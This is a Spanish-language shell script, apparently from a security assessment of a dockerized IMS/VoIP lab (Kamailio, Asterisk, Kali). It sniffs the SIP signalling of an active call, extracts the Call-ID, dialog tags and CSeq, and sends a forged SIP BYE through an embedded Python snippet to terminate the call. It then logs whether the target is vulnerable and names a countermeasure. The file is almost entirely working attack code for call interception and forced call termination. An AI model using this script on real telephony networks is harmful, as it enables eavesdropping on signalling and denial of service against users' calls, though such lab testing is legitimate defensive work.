#!/bin/sh
# ============================================================================
# v7_bye.sh — V7 Terminación forzada con SIP BYE forjado (sin auth de diálogo).
# Requiere llamada ACTIVA (ej: 1001->1000 echo). Captura el diálogo en el
# P-CSCF/S-CSCF, extrae Call-ID, tags From/To, CSeq y el Contact remoto, y
# envía un BYE spoofeado con el RURI correcto + Route al P-CSCF.
# Éxito = la llamada cae (0 canales PJSIP en Asterisk).
# Modos: auto (captura y extrae) / manual (pegar valores).
# Uso: ./v7_bye.sh  (pregunta parámetros; entre [] el valor probado)
# ============================================================================
set -eu
cd "$(dirname "$0")/.."
export MSYS_NO_PATHCONV=1

log() { echo "[v7] $*"; }
ask() {
  printf "%s [%s]: " "$2" "$3" >&2
  read -r ans || ans=""
  [ -n "$ans" ] || ans="$3"
  echo "$ans"
}

docker ps --format "{{.Names}}" 2>/dev/null | tr -d '\r' | grep -qx kali \
  || { log "ERROR: kali no corre (docker compose up -d kali)"; exit 1; }
mkdir -p results; touch results/hashes.txt 2>/dev/null || true

SRCU=$(ask SRCU "Llamante (From)" "1001")
DSTU=$(ask DSTU "Llamado (To)" "1000")
DOMAIN=$(ask DOMAIN "Dominio IMS" "ims.mnc070.mcc999.3gppnetwork.org")
PCSCF_IP=$(ask PCSCF_IP "IP P-CSCF destino del BYE" "172.20.0.6")
PCSCF_PORT=$(ask PCSCF_PORT "Puerto P-CSCF" "4060")
MODE=$(ask MODE "Modo: auto (capturar diálogo) / manual (pegar valores)" "auto")
CAPSEC=$(ask CAPSEC "Segundos de captura (debe cubrir la llamada)" "40")
TS=$(date -u +%Y%m%dT%H%M%SZ)

CALLID=""; FROMTAG=""; TOTAG=""; CSEQ=""; RURI=""

if [ "$MODE" = "auto" ]; then
  log "Capturando $CAPSEC s en kamailio (P-CSCF/S-CSCF)."
  log ">>> Inicie AHORA la llamada $SRCU->$DSTU y manténgala activa <<<"
  # kamailio no trae tshark: se captura con tcpdump y se extrae en kali.
  docker exec kamailio sh -c "rm -f /tmp/v7.pcapng; timeout $((CAPSEC + 10)) tcpdump -i any -w /tmp/v7.pcapng 'udp port 4060 or udp port 5060 or udp port 6060' >/tmp/v7cap.log 2>&1" >/dev/null 2>&1 &
  sleep "$CAPSEC"
  docker exec kamailio sh -c "pkill -x tcpdump 2>/dev/null || true" >/dev/null 2>&1 || true
  sleep 1
  docker cp kamailio:/tmp/v7.pcapng /tmp/v7_$TS.pcapng >/dev/null 2>&1 \
    || { log "ERROR: kamailio no escribió /tmp/v7.pcapng"; exit 1; }
  docker cp /tmp/v7_$TS.pcapng kali:/root/v7.pcapng >/dev/null

  # El primer INVITE del llamante define el diálogo.
  INV=$(docker exec kali tshark -r /root/v7.pcapng \
        -Y "sip.Method == \"INVITE\" && sip.from.user == \"$SRCU\"" \
        -T fields -e sip.Call-ID -e sip.from.tag -e sip.CSeq 2>/dev/null | head -n 1 | tr -d '\r')
  CALLID=$(echo "$INV" | cut -f1)
  FROMTAG=$(echo "$INV" | cut -f2)
  INVCSEQ=$(echo "$INV" | cut -f3 | cut -d' ' -f1)

  if [ -n "$CALLID" ] && [ -n "$INVCSEQ" ]; then
    CSEQ=$((INVCSEQ + 1))
    OK=$(docker exec kali tshark -r /root/v7.pcapng \
         -Y "sip.Status-Code == 200 && sip.Call-ID == \"$CALLID\"" \
         -T fields -e sip.to.tag -e sip.Contact 2>/dev/null | head -n 1 | tr -d '\r')
    TOTAG=$(echo "$OK" | cut -f1)
    # Contact del llamado: es el R-URI real del BYE (no sip:DSTU@dominio).
    RURI=$(echo "$OK" | cut -f2- | tr -d '<>' | sed 's/[[:space:]].*//; s/;.*//')
  fi
  log "Extraído: Call-ID=${CALLID:-?} From-tag=${FROMTAG:-?} To-tag=${TOTAG:-?} CSeq=${CSEQ:-?}"
  log "R-URI remoto (Contact del 200 OK): ${RURI:-?}"
  if [ -z "$CALLID" ] || [ -z "$FROMTAG" ] || [ -z "$TOTAG" ] || [ -z "$RURI" ]; then
    log "Auto-extracción incompleta (¿no hubo llamada/200 OK en la ventana?). Pase a modo manual."
    MODE="manual"
  fi
fi

if [ "$MODE" = "manual" ]; then
  log "Valores: captura con 'tshark -Y sip' en kali; leer INVITE (Call-ID, From-tag, CSeq) y 200 OK (To-tag, Contact)."
  [ -n "$CALLID" ] || CALLID=$(ask CALLID "Call-ID del diálogo" "")
  [ -n "$FROMTAG" ] || FROMTAG=$(ask FROMTAG "tag del From (llamante)" "")
  [ -n "$TOTAG" ] || TOTAG=$(ask TOTAG "tag del To (llamado)" "")
  [ -n "$CSEQ" ] || CSEQ=$(ask CSEQ "CSeq del BYE (INVITE+1)" "3")
  [ -n "$RURI" ] || RURI=$(ask RURI "R-URI remoto del 200 OK (Contact)" "sip:172.20.0.7:5061")
fi

[ -n "$CALLID" ] && [ -n "$FROMTAG" ] && [ -n "$TOTAG" ] && [ -n "$CSEQ" ] && [ -n "$RURI" ] \
  || { log "ERROR: faltan Call-ID/tags/CSeq/R-URI"; exit 1; }

BEFORE=$(docker exec asterisk asterisk -rx "core show channels" 2>/dev/null | grep -a -c PJSIP || true)
log "Canales PJSIP antes: $BEFORE (se espera >=1 con llamada activa)"

log "Enviando BYE forjado (From-tag=$FROMTAG To-tag=$TOTAG CSeq=$CSEQ)..."
log "  $RURI  + Route <sip:$PCSCF_IP:$PCSCF_PORT;lr>"
docker exec -e CALLID="$CALLID" -e FROMTAG="$FROMTAG" -e TOTAG="$TOTAG" -e CSEQ="$CSEQ" \
  -e SRCU="$SRCU" -e DSTU="$DSTU" -e DOMAIN="$DOMAIN" -e PCSCF_IP="$PCSCF_IP" \
  -e PCSCF_PORT="$PCSCF_PORT" -e RURI="$RURI" \
  kali python3 -c "
import os, socket, time
callid=os.environ['CALLID']; ftag=os.environ['FROMTAG']; ttag=os.environ['TOTAG']
cseq=os.environ['CSEQ']; src=os.environ['SRCU']; dst=os.environ['DSTU']
dom=os.environ['DOMAIN']; tgt=os.environ['PCSCF_IP']; port=int(os.environ['PCSCF_PORT'])
ruri=os.environ['RURI']
branch='z9hG4bKv7%x' % int(time.time())
bye=('BYE %s SIP/2.0\r\n'
 'Via: SIP/2.0/UDP 172.20.0.99:5060;branch=%s\r\n'
 'Max-Forwards: 70\r\n'
 'Route: <sip:%s:%d;lr>\r\n'
 'From: <sip:%s@%s>;tag=%s\r\n'
 'To: <sip:%s@%s>;tag=%s\r\n'
 'Call-ID: %s\r\n'
 'CSeq: %s BYE\r\n'
 'Content-Length: 0\r\n\r\n') % (ruri, branch, tgt, port, src, dom, ftag, dst, dom, ttag, callid, cseq)
s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
for _ in range(3):
    s.sendto(bye.encode(), (tgt, port)); time.sleep(0.5)
print('BYE forjado enviado %s CSeq=%s branch=%s' % (ruri, cseq, branch))
"
sleep 5
AFTER=$(docker exec asterisk asterisk -rx "core show channels" 2>/dev/null | grep -a -c PJSIP || true)
log "Canales activos en Asterisk (0 = llamada terminada = ÉXITO): $AFTER (antes $BEFORE)"

# Evidencia: pcap del diálogo + resumen del BYE
docker cp kamailio:/tmp/v7.pcapng /tmp/v7_$TS.pcapng >/dev/null 2>&1 || true
if [ -f "/tmp/v7_$TS.pcapng" ]; then
  cp "/tmp/v7_$TS.pcapng" "results/v7_bye_${SRCU}-to-${DSTU}_$TS.pcapng"
  docker cp "results/v7_bye_${SRCU}-to-${DSTU}_$TS.pcapng" kali:/root/results/ >/dev/null 2>&1 || true
  BYES=$(docker exec kali tshark -r "/root/results/v7_bye_${SRCU}-to-${DSTU}_$TS.pcapng" -Y 'sip.Method == "BYE"' 2>/dev/null | wc -l || true)
  BYEOK=$(docker exec kali tshark -r "/root/results/v7_bye_${SRCU}-to-${DSTU}_$TS.pcapng" -Y 'sip.Method == "BYE" || sip.CSeq.method == "BYE"' 2>/dev/null | grep -a -c '200 OK' || true)
  H=$(sha256sum "results/v7_bye_${SRCU}-to-${DSTU}_$TS.pcapng" | cut -d' ' -f1)
  echo "$H  v7_bye_${SRCU}-to-${DSTU}_$TS.pcapng  V7  $(date -u +%Y-%m-%dT%H:%M:%SZ)  BYE forjado $SRCU->$DSTU Call-ID $CALLID CSeq $CSEQ RURI $RURI (canales $BEFORE->$AFTER, BYEs=$BYES)" >> results/hashes.txt
else
  echo "no-pcap  v7_bye_${SRCU}-to-${DSTU}_$TS  V7  $(date -u +%Y-%m-%dT%H:%M:%SZ)  BYE forjado Call-ID $CALLID (canales $BEFORE->$AFTER)" >> results/hashes.txt
fi

if [ "$AFTER" = "0" ] && [ "$BEFORE" != "0" ]; then
  log "VEREDICTO: VULNERABLE (llamada terminada por BYE sin auth)."
elif [ "$BEFORE" = "0" ]; then
  log "VEREDICTO: no concluyente (no había llamada activa; repetir con llamada en curso)."
else
  log "VEREDICTO: MITIGADO (la llamada sigue en pie; verificar 403/481 del P-CSCF)."
fi
log "F4 contramedida: binding identidad<->origen en P-CSCF + TLS para que los tags no sean observables -> 403 y llamada en pie."
